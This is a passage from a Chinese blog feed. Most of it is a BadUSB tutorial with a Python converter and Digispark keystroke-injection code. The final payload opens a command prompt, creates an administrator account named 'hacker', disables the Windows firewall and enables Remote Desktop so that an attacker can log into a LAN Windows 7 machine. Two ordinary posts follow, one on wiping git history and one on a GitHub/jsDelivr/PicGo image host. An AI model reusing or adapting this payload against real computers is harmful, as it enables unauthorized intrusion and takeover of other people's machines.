class="string">'w'</span>)</span><br><span class="line">        z = len(open(sys.argv[<span class="number">1</span>], <span class="string">"r"</span>).readlines())</span><br><span class="line">    <span class="keyword">except</span> IOError:</span><br><span class="line">        print(<span class="string">'\nError!, File "'</span>+sys.argv[<span class="number">1</span>]+<span class="string">'" does not exist!\n'</span> )</span><br><span class="line">        exit()</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">3</span>:</span><br><span class="line">    print(<span class="string">'Too much Arguments'</span>)</span><br><span class="line">    exit()</span><br><span class="line"><span class="keyword">else</span>:    </span><br><span class="line">    payload_input = open(<span class="string">'payload.txt'</span>, <span class="string">"r"</span>)</span><br><span class="line">    sys.stdout = open(<span class="string">"digipayload.ino"</span>, <span class="string">"w"</span>)</span><br><span class="line">    z = len(open(<span class="string">'payload.txt'</span>, <span class="string">"r"</span>).readlines())</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------------------</span></span><br><span class="line"><span class="comment">#Digispark program fragment</span></span><br><span class="line">print(<span class="string">'//www.liuwx.cn&amp;Qq211124332'</span>)</span><br><span class="line">print(<span class="string">'#include "DigiKeyboard.h"'</span>)</span><br><span class="line">print(<span class="string">'#define KEY_ESC     41'</span>)</span><br><span class="line">print(<span class="string">'#define KEY_BACKSPACE 42'</span>)</span><br><span class="line">print(<span class="string">'#define KEY_TAB     43'</span>)</span><br><span class="line">print(<span class="string">'#define KEY_PRT_SCR 70'</span>)</span><br><span class="line">print(<span class="string">'#define KEY_DELETE  76\n'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'void setup() {\n'</span>)</span><br><span class="line">print(<span class="string">'DigiKeyboard.delay(5000);'</span>) <span class="comment">#windows mozhet dolgo raspoznavat digispark potomu bylo resheno dobavlyat 5 sek delay vmesto 0.5sek</span></span><br><span class="line">print(<span class="string">'DigiKeyboard.sendKeyStroke(0);'</span>)</span><br><span class="line"><span class="comment">#---------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(z):</span><br><span class="line">    l = payload_input.readline().replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> len (l) &lt; <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">''</span>, end = <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'REM'</span> <span class="keyword">in</span> l:</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">'//'</span>, l)    </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'DELAY'</span> <span class="keyword">in</span> l:</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">'DigiKeyboard.'</span>, end = <span class="string">''</span>)</span><br><span class="line">                <span class="keyword">print</span> (l.replace(<span class="string">'DELAY'</span>, <span class="string">'delay('</span>).replace(<span class="string">' '</span>,<span class="string">''</span>), end = <span class="string">''</span>)</span><br><span class="line">                print(<span class="string">');'</span>)</span><br><span class="line">                        </span><br><span class="line">            <span class="keyword">elif</span> <span class="string">'STRING'</span> <span class="keyword">in</span> l:</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">'DigiKeyboard.'</span>, end = <span class="string">''</span>)</span><br><span class="line">                <span class="keyword">print</span> (l.replace(<span class="string">'"'</span>, <span class="string">'")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F("'</span>)</span><br><span class="line">                       .replace(<span class="string">'\\'</span>, <span class="string">'")); DigiKeyboard.print(char(92)); DigiKeyboard.print(F("'</span>)</span><br><span class="line">                       .replace(<span class="string">'STRING '</span>,<span class="string">'print(F("'</span>), end = <span class="string">''</span>)</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">'")'</span>, end = <span class="string">''</span>)</span><br><span class="line">                print(<span class="string">');'</span>);</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">elif</span> (l == <span class="string">'GUI'</span>) <span class="keyword">or</span> (l == <span class="string">'WINDOWS'</span>) <span class="keyword">or</span> (l == <span class="string">'CONTROL ESCAPE'</span>):</span><br><span class="line">                print(<span class="string">'DigiKeyboard.sendKeyStroke(KEY_ESC,MOD_CONTROL_LEFT);'</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> (l == <span class="string">'GUI d'</span>) <span class="keyword">or</span> (l == <span class="string">'WINDOWS d'</span>):</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">'DigiKeyboard.sendKeyStroke(KEY_D,MOD_GUI_LEFT);'</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">elif</span> (l == <span class="string">'WINDOWS r'</span>) <span class="keyword">or</span> (l == <span class="string">'GUI r'</span>):</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">'DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);'</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">'MENU'</span> <span class="keyword">in</span> l:</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">'DigiKeyboard.sendKeyStroke(MOD_GUI_RIGHT);'</span>)</span><br><span class="line">                </span><br><span class="line">        <span class="comment">#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!INVERCE!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!    </span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">'CTRL ALT'</span> <span class="keyword">in</span> l:</span><br><span class="line">                replacement()</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">'ALT'</span> <span class="keyword">in</span> l:</span><br><span class="line">                mod_input = <span class="string">'ALT'</span></span><br><span class="line">                mod_output = <span class="string">'MOD_ALT_RIGHT'</span></span><br><span class="line">                modreplacement()</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">'CTRL'</span> <span class="keyword">in</span> l:</span><br><span class="line">                mod_input = <span class="string">'CTRL'</span></span><br><span class="line">                mod_output = <span class="string">'MOD_CONTROL_LEFT'</span></span><br><span class="line">                modreplacement()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">'CONTROL'</span> <span class="keyword">in</span> l:</span><br><span class="line">                mod_input = <span class="string">'CONTROL'</span></span><br><span class="line">                mod_output = <span class="string">'MOD_CONTROL_LEFT'</span></span><br><span class="line">                modreplacement()</span><br><span class="line"></span><br><span class="line">        <span class="comment">#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!        </span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                replacement()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(l) &lt;<span class="number">1</span>:</span><br><span class="line">            print(<span class="string">''</span>, end = <span class="string">''</span>)</span><br><span class="line"><span class="comment">#Digispark program fragment</span></span><br><span class="line">print(<span class="string">'\n}'</span>)</span><br><span class="line">print(<span class="string">'\n'</span>)</span><br><span class="line">print(<span class="string">'void loop() {\n'</span>)</span><br><span class="line">print(<span class="string">'}\n'</span>)</span><br><span class="line"><span class="comment">#-----------------------------------</span></span><br><span class="line"></span><br><span class="line">payload_input.close()</span><br></pre></td></tr></tbody></table></figure><p>转换完成后再当前目录下会有一个<code>hacker.ino</code>文件：</p><p><img alt="图片" data-src="img/306.png" class="lazyload"></p><p>打开后的代码是这样的：</p><p><img alt="图片" data-src="img/307.png" class="lazyload"></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">//www.liuwx.cn&amp;Qq211124332</span><br><span class="line"><span class="comment">#include "DigiKeyboard.h"</span></span><br><span class="line"><span class="comment">#define KEY_ESC     41</span></span><br><span class="line"><span class="comment">#define KEY_BACKSPACE 42</span></span><br><span class="line"><span class="comment">#define KEY_TAB     43</span></span><br><span class="line"><span class="comment">#define KEY_PRT_SCR 70</span></span><br><span class="line"><span class="comment">#define KEY_DELETE  76</span></span><br><span class="line"></span><br><span class="line">void setup() {</span><br><span class="line"></span><br><span class="line">DigiKeyboard.delay(<span class="number">5000</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">0</span>);</span><br><span class="line">DigiKeyboard.delay(<span class="number">5000</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.print(F(<span class="string">"cmd"</span>));</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.delay(<span class="number">1000</span>);</span><br><span class="line">DigiKeyboard.print(F(<span class="string">"Hello Hacker!"</span>));</span><br><span class="line">DigiKeyboard.delay(<span class="number">1500</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void loop() {</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>3、上传脚本 - 插入<code>BadUSB</code>进行烧录程序:</p><p><img alt="图片" data-src="img/308.png" class="lazyload"></p><p>上传成功后，它会自动执行我们的操作：会在屏幕上输出Hello Hacker！</p><h2 id="插上U盘入侵局域网Win7登陆它的远程桌面"><a href="#插上U盘入侵局域网Win7登陆它的远程桌面" class="headerlink" title="插上U盘入侵局域网Win7登陆它的远程桌面"></a>插上U盘入侵局域网Win7登陆它的远程桌面</h2><blockquote><p>本来想写MSF + BadUSB 反弹Win7和Win10的Shell，但是百度上有了，我就没必要写在这篇文章了！</p></blockquote><h3 id="思路和主要步骤"><a href="#思路和主要步骤" class="headerlink" title="思路和主要步骤"></a>思路和主要步骤</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1、在局域网中有一台PC-Win7系统</span><br><span class="line"></span><br><span class="line">2、插上BadUSB关掉Win7的防火墙</span><br><span class="line"></span><br><span class="line">3、创建一个HACKER的用户并提权为超级管理员</span><br><span class="line"></span><br><span class="line">4、开启Win7的3389</span><br><span class="line"></span><br><span class="line">5、局域网另一台电脑mstsc登陆Win7的桌面</span><br></pre></td></tr></tbody></table></figure><h3 id="命令注释"><a href="#命令注释" class="headerlink" title="命令注释"></a>命令注释</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">关闭防火墙的命令：netsh firewall set opmode mode=disable</span><br><span class="line"></span><br><span class="line">打开Win7的3389命令：REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">至于我为什么会吧上面这条开3389的命令有些字母是大写又有些字母是小写：</span><br><span class="line"></span><br><span class="line">reg add hklm\\system\\cURRENTcONTROLsET\\cONTROL\\tERMINAL\" \"sERVER /V FdENYtscONNECTIONS /T reg_dword /D 0 /F</span><br><span class="line"></span><br><span class="line">因为插入BadUSB会首先按下我们的大写锁定!然后才执行命令，因为怕有的电脑有中午输入法！所以我上面的语句要这样写！他会吧小写的在DOS窗口输出为大写，大写的命令会输出为小写！</span><br><span class="line"></span><br><span class="line">按下回车键：DigiKeyboard.sendKeyStroke(KEY_ENTER); </span><br><span class="line"></span><br><span class="line">延迟2秒执行（有的时候延迟时间短了会执行失败）：DigiKeyboard.delay(2000);</span><br></pre></td></tr></tbody></table></figure><p>附上代码如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//www.liuwx.cn QQ211124332</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"DigiKeyboard.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_ESC     41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_BACKSPACE 42</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_TAB     43</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_PRT_SCR 70</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_DELETE  76</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_CAPS_LOCK  0x39</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>{</span><br><span class="line"></span><br><span class="line">DigiKeyboard.<span class="built_in">delay</span>(<span class="number">2000</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">0</span>);</span><br><span class="line">DigiKeyboard.<span class="built_in">delay</span>(<span class="number">2000</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_CAPS_LOCK);</span><br><span class="line">DigiKeyboard.<span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">"cmd"</span>));</span><br><span class="line">DigiKeyboard.<span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.<span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line">DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">"color c"</span>));</span><br><span class="line">DigiKeyboard.<span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.<span class="built_in">delay</span>(<span class="number">200</span>);</span><br><span class="line">DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">"net user hacker Qliuwx123@ /add"</span>));</span><br><span class="line">DigiKeyboard.<span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.<span class="built_in">delay</span>(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">"net localgroup administrators hacker /add"</span>));</span><br><span class="line">DigiKeyboard.<span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">"netsh firewall set opmode mode=disable"</span>)); <span class="comment">//关闭防火墙</span></span><br><span class="line">DigiKeyboard.<span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.<span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line">DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">"reg add hklm\\system\\cURRENTcONTROLsET\\cONTROL\\tERMINAL\" \"sERVER /V FdENYtscONNECTIONS /T reg_dword /D 0 /F"</span>));  <span class="comment">//开3389</span></span><br><span class="line">DigiKeyboard.<span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>{</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>具体演示的效果我放到了B站上：</p><p><a href="https://www.bilibili.com/video/av69355396" target="_blank" rel="noopener">插上U盘开启Win7的3389并关闭防火墙实施登陆它远程桌面</a></p></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;!--页面头部添加--&gt;

&lt;h1 id=&quot;U盘攻击：无视防火墙-3秒黑掉你的电脑-BadUSB-制作教程&quot;&gt;&lt;a href=&quot;#U盘攻击：无视防火墙-3秒黑掉你的电脑-BadUSB-制作教
      
    
    </summary>
    
    
      <category term="hack" scheme="https://www.nikoyu.asia/categories/hack/"/>
    
    
      <category term="U盘" scheme="https://www.nikoyu.asia/tags/U%E7%9B%98/"/>
    
  </entry>
  
  <entry>
    <title>Github清除历史提交，保留最新提交</title>
    <link href="https://www.nikoyu.asia/Github%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E6%8F%90%E4%BA%A4%EF%BC%8C%E4%BF%9D%E7%95%99%E6%9C%80%E6%96%B0%E6%8F%90%E4%BA%A4.html"/>
    <id>https://www.nikoyu.asia/Github%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E6%8F%90%E4%BA%A4%EF%BC%8C%E4%BF%9D%E7%95%99%E6%9C%80%E6%96%B0%E6%8F%90%E4%BA%A4.html</id>
    <published>2019-12-25T01:41:01.000Z</published>
    <updated>2020-09-17T03:20:45.594Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Github清除历史提交，保留最新提交"><a href="#Github清除历史提交，保留最新提交" class="headerlink" title="Github清除历史提交，保留最新提交"></a>Github清除历史提交，保留最新提交</h1><h2 id="有时候，需要启动一个新的分支，同时想摒弃历史信息，那么可以使用下面的方法来实现"><a href="#有时候，需要启动一个新的分支，同时想摒弃历史信息，那么可以使用下面的方法来实现" class="headerlink" title="有时候，需要启动一个新的分支，同时想摒弃历史信息，那么可以使用下面的方法来实现"></a>有时候，需要启动一个新的分支，同时想摒弃历史信息，那么可以使用下面的方法来实现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#克隆git仓库</span><br><span class="line">git clone [URL] </span><br><span class="line">#进入git仓库</span><br><span class="line">cd [仓库名] </span><br><span class="line"></span><br><span class="line">#创建一个名为 new_branch 新的空分支(不包含历史的分支)</span><br><span class="line">git checkout --orphan  new_branch</span><br><span class="line"></span><br><span class="line">#添加所有文件到new_branch分支，对new_branch分支做一次提交</span><br><span class="line">git add -A</span><br><span class="line">git commit -am &#39;提交信息&#39; </span><br><span class="line"></span><br><span class="line">#删除master分支</span><br><span class="line">git branch -D master </span><br><span class="line">#将当前所在的new_branch分支重命名为master</span><br><span class="line">git branch -m master</span><br><span class="line">#将更改强制推送到github仓库</span><br><span class="line">git push origin master --force</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Github清除历史提交，保留最新提交&quot;&gt;&lt;a href=&quot;#Github清除历史提交，保留最新提交&quot; class=&quot;headerlink&quot; title=&quot;Github清除历史提交，保留最新提交&quot;&gt;&lt;/a&gt;Github清除历史提交，保留最新提交&lt;/h1&gt;&lt;h2 i
      
    
    </summary>
    
    
      <category term="工作学习" scheme="https://www.nikoyu.asia/categories/%E5%B7%A5%E4%BD%9C%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="IT" scheme="https://www.nikoyu.asia/tags/IT/"/>
    
      <category term="git" scheme="https://www.nikoyu.asia/tags/git/"/>
    
      <category term="github" scheme="https://www.nikoyu.asia/tags/github/"/>
    
  </entry>
  
  <entry>
    <title>Github+jsDelivr+PicGo 打造稳定快速、高效免费图床</title>
    <link href="https://www.nikoyu.asia/pic-go.html"/>
    <id>https://www.nikoyu.asia/pic-go.html</id>
    <published>2019-12-23T03:31:32.000Z</published>
    <updated>2020-09-17T03:20:45.604Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><!--页面头部添加--><h1 id="Github-jsDelivr-PicGo-打造稳定快速、高效免费图床"><a href="#Github-jsDelivr-PicGo-打造稳定快速、高效免费图床" class="headerlink" title="Github+jsDelivr+PicGo 打造稳定快速、高效免费图床"></a>Github+jsDelivr+PicGo 打造稳定快速、高效免费图床</h1><section class="article typo">        <div class="article-entry" itemprop="articleBody">          <fancybox><br><a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/ImgHosting.png"><img alt="ImgHosting" data-src="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/ImgHosting.png" class="lazyload"></a><br></fancybox><hr><h1 id="–-前言"><a href="#–-前言" class="headerlink" title="– 前言"></a><font color="#FF000">– 前言</font></h1><p>图床是个啥东西就不用过多介绍了，先来对比一下各路图床：</p><blockquote><ul><li>微博图床：以前用的人比较多，从2019年4月开始开启了防盗链，凉凉</li><li>SM.MS：运营四年多了，也变得越来越慢了，到了晚上直接打不开图片，速度堪忧</li><li>其他小众图床：随时有挂掉的风险</li><li>Imgur等国外图床：国内访问速度太慢，随时有被墙的风险</li><li>大厂储存服务：例如七牛云、又拍云、腾讯云COS、阿里云OSS等，容量限制，操作繁琐，又是实名认证又是域名备案的，麻烦，而且还要花钱（有钱又不怕麻烦的当我没说）</li></ul></blockquote><p>因此，GitHub 图床是个不错的选择，利用 jsDelivr CDN 加速访问（jsDelivr 是一个免费开源的 CDN 解决方案），PicGo 工具一键上传，操作简单高效，GitHub 和 jsDelivr 都是大厂，不用担心跑路问题，不用担心速度和容量问题，而且完全免费，可以说是目前免费图床的最佳解决方案！</p><hr><h1 id="–-新建GitHub仓库"><a href="#–-新建GitHub仓库" class="headerlink" title="– 新建GitHub仓库"></a><font color="#FF000">– 新建GitHub仓库</font></h1><p>登录/注册GitHub，新建一个仓库，填写好仓库名，仓库描述，根据需求选择是否为仓库初始化一个README.md描述文件</p><fancybox><br><a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/01.png"><img alt="01" data-src="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/01.png" class="lazyload"></a><br></fancybox><br><fancybox><br><a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/02.png"><img alt="02" data-src="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/02.png" class="lazyload"></a><br></fancybox><hr><h1 id="–-生成一个Token"><a href="#–-生成一个Token" class="headerlink" title="– 生成一个Token"></a><font color="#FF000">– 生成一个Token</font></h1><p>在主页依次选择【Settings】-【Developer settings】-【Personal access tokens】-【Generate new token】，填写好描述，勾选【repo】，然后点击【Generate token】生成一个Token，注意这个Token只会显示一次，自己先保存下来，或者等后面配置好PicGo后再关闭此网页</p><fancybox><br><a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/03.png"><img alt="03" data-src="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/03.png" class="lazyload"></a><br></fancybox><br><fancybox><br><a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/04.png"><img alt="04" data-src="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/04.png" class="lazyload"></a><br></fancybox><br><fancybox><br><a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/05.png"><img alt="05" data-src="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/05.png" class="lazyload"></a><br></fancybox><br><fancybox><br><a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/06.png"><img alt="06" data-src="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/06.png" class="lazyload"></a><br></fancybox><br><fancybox><br><a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/07.png"><img alt="07" data-src="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/07.png" class="lazyload"></a><br></fancybox><h1 id="–-配置PicGo"><a href="#–-配置PicGo" class="headerlink" title="– 配置PicGo"></a><font color="#FF000">– 配置PicGo</font></h1><p>前往<a href="https://github.com/Molunerfinn/picgo/releases" target="_blank" rel="noopener">下载PicGo</a>，安装好后开始配置图床</p><fancybox><br><a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/08.png"><img alt="08" data-src="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/08.png" class="lazyload"></a><br></fancybox><ul><li><p><font color="#FF000">设定仓库名：</font>按照【用户名/图床仓库名】的格式填写</p></li><li><p><font color="#FF000">设定分支名：</font>【master】</p></li><li><p><font color="#FF000">设定Token：</font>粘贴之前生成的【Token】</p></li><li><p><font color="#FF000">指定存储路径：</font>填写想要储存的路径，如【ITRHX-PIC/】，这样就会在仓库下创建一个名为 ITRHX-PIC 的文件夹，图片将会储存在此文件夹中</p></li><li><p><font color="#FF000">设定自定义域名：</font>它的作用是，在图片上传后，PicGo 会按照【自定义域名+储存路径+上传的图片名】的方式生成访问链接，并放到粘贴板上，因为我们要使用 jsDelivr 加速访问，所以可以设置为【<a href="https://cdn.jsdelivr.net/gh/用户名/图床仓库名" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/用户名/图床仓库名</a> 】，上传完毕后，我们就可以通过【<a href="https://cdn.jsdelivr.net/gh/用户名/图床仓库名/图片路径" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/用户名/图床仓库名/图片路径</a> 】加速访问我们的图片了，比如上图的图片链接为：<a href="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/08.png" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/08.png</a></p></li></ul><p>关于 jsDelivr 具体是如何引用资源的可以参考我的另一篇博客：<a href="https://www.itrhx.com/2019/02/10/A18-free-cdn/">《免费CDN：jsDelivr+Github》</a></p><hr><h1 id="–-进行高效创作"><a href="#–-进行高效创作" class="headerlink" title="– 进行高效创作"></a><font color="#FF000">– 